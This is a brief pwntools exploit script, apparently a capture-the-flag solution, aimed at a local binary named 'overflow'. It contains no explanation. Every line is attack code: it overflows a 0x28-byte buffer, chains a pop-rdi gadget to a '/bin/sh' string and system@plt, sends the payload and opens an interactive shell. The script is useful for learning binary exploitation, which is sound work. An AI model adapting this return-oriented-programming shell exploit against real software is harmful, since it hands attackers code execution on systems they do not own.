from pwn import *
sh=process('./overflow')
#sh = gdb('/overflow')
context.log_level='debug'
#system=0x401090
elf=ELF('./overflow')
system=elf.plt['system']-4
main=elf.sym['main']
print("system:",hex(system))
pop_rdi=0x40133b
#binsh=0x40208b+6
binsh=0x4020a1
pay=b'a'*0x28+p64(pop_rdi)+p64(binsh)+p64(0x40101a)+p64(system)+p64(main)
sh.recvuntil("int.\n")
#gdb.attach(sh)
pause()
sh.send(pay)

sh.recvuntil("okk")

sh.interactive()
